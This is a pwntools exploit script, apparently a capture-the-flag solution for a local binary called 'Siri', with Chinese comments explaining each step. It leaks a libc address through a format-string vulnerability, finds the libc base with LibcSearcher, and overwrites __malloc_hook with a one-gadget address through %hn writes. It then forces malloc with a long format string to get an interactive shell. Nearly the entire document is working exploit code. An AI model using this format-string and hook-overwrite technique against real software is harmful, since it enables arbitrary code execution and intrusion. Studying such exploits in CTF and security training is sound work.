from pwn import *
from LibcSearcher import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./Siri')

p.recvuntil('>>> ')
p.send('Hey Siri!')
p.recvuntil('\n>>> ')

# 获取__malloc_hook的地址
p.send('Remind me to %103$p')
libc_start_main = int(p.recv()[27:27+14], 16) - 128
libc = LibcSearcher('__libc_start_main', libc_start_main)
libc_base   = libc_start_main - libc.dump('__libc_start_main')
malloc_hook = libc_base + libc.dump('__malloc_hook')
gadget      = libc_base + 0xebc85

# 因为调用printf输入长的字符串会调用malloc重新申请更大的缓冲区
# malloc函数调用malloc_hook函数指针
# 那么我们可以修改malloc_hook指向我们找到的onegadget
payload = b'Remind me to '
write_size = 0
for i in range(3):
    vulen  = (gadget>>(i*16)) & 0xffff
    vulen -= 27
    # 对于每个字节，我们都需要写入一个字节，所以我们需要写入vulen个字节
    # 如果已经输入的字符大于了将要输入的值, 那么我们就需要输入对应的负数
    if(vulen > write_size&0xffff):
        payload += b'%' + bytes(str(vulen - (write_size&0xffff)).encode()) + b'c%' + bytes(str(55 + i).encode()) + b'$hn'
        write_size+=vulen - (write_size&0xffff)
    else:
        payload += b'%' + bytes(str(0x10000 - (write_size&0xffff) + vulen).encode()) + b'c%' + bytes(str(55 + i).encode()) + b'$hn'
        write_size+=0x10000 - (write_size&0xffff) + vulen
# 由于我们的payload长度是80，所以我们需要填充一些东西
payload += b'a' * (80 - len(payload) - 8 * 3)
# 设置56~80字节为malloc_hook的地址进行赋值
payload += p64(malloc_hook)
payload += p64(malloc_hook+2)
payload += p64(malloc_hook+4)

p.send('Hey Siri!')
p.recvuntil('\n>>> ')
p.send(payload)

p.recvuntil('>>> ')
p.send('Hey Siri!')
p.recvuntil('\n>>> ')
# 写入大量字符串触发malloc函数
p.send('Remind me to %99999c')
p.interactive()

